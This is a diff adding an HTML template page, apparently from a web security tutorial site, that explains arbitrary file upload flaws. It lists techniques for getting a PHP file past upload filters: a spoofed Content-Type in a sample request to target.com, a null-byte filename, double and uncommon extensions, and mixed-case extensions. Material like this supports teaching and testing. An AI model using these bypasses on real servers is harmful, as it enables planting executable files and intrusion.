@@ -1,0 +1,120 @@
+{% extends './base.html' %}
+{% block body %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Arbitrary File Upload</title>
+    <style>
+body, h1, h2, p, ol, li, pre, code {
+    margin: 0;
+    padding: 0;
+}
+
+body {
+    font-family: Arial, sans-serif;
+    line-height: 1.6;
+    padding: 20px;
+}
+
+article {
+    max-width: 800px;
+    margin: 0 auto;
+}
+
+h1 {
+    font-size: 2em;
+    margin-bottom: 20px;
+}
+
+h2 {
+    font-size: 1.5em;
+    margin-top: 20px;
+    margin-bottom: 10px;
+}
+
+section {
+    margin-bottom: 20px;
+}
+
+pre {
+    background-color: #f8f8f8;
+    padding: 10px;
+    border-radius: 5px;
+    margin-bottom: 10px;
+}
+
+code {
+    font-family: Consolas, monospace;
+}
+
+/* Style Markdown code blocks */
+pre code {
+    display: block;
+    padding: 10px;
+    background-color: #f0f0f0;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    overflow-x: auto;
+}
+
+    </style>
+</head>
+<body>
+    <article>
+        <h1>Arbitrary File Upload</h1>
+        <section>
+            <h2>Introduction</h2>
+            <p>An arbitrary file upload vulnerability is a type of security flaw that allows an attacker to upload malicious files onto a server.</p>
+        </section>
+        <section>
+            <h2>Where to find</h2>
+            <p>In upload file feature, for example upload photo profile feature</p>
+        </section>
+        <section>
+            <h2>How to exploit</h2>
+            <ol>
+                <li>
+                    <p>Change the <code>Content-Type</code> value</p>
+                    <pre><code>POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php</code></pre>
+                    <p>Change the Content-Type</p>
+                    <pre><code>POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/jpeg</code></pre>
+                </li>
+                <!-- Other exploitation techniques go here -->
+                <li>
+                    <p>Using null byte in filename</p>
+                    <pre><code>file.php%00.gif</code></pre>
+                </li>
+                <li>
+                    <p>Using double extensions for the uploaded file</p>
+                    <pre><code>file.jpg.php</code></pre>
+                </li>
+                <li>
+                    <p>Uploading an unpopular php extensions (php4,php5,php6,phtml)</p>
+                    <pre><code>file.php5</code></pre>
+                </li>
+                <li>
+                    <p>Try to randomly capitalize the file extension</p>
+                    <pre><code>file.pHP5</code></pre>
+                </li>
+                <li>
+                    <pre>Mix the tips!</pre>
+                </li>
+            </ol>
+        </section>
+    </article>
+</body>
+{% endblock %}
